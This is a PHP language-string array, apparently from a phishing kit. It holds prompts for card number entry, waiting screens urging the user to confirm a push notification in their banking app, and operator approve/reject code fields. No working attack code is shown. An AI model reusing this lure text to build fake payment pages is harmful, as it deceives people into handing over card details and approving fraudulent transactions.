...
function lang($phrase){
    static $lang = array(
        ...
        "xinfoz11" => "Continue",
        "xpay1" => "Enter your payment details",
        "xpay2" => "Card Number",
        ...
        "xwait1" => "Approval in progress",
        "xwait2" => "We are validating your approval request.",
        "xwait3" => "Please confirm the push notification in your banking app to finalize the payment.",
        "xwait4" => "Confirm the approval inside your banking application.",
        "xwait5" => "Automatic verification in %s seconds",
        "xwait6" => "I've confirmed, check now",
        ...
        "approve" => "Approve",
        "reject" => "Reject",
        "xapprove1" => "Approve Payment",
        "xapprove2" => "Approval Code",
        "xapprove3" => "Approval Code is invalid",
        "xapprove4" => "Confirm",
        "xbadapprove1" => "Reject Payment",
        "xbadapprove2" => "Rejection Code",
        "xbadapprove3" => "Rejection Code is invalid",
        "xbadapprove4" => "Reject"
    );
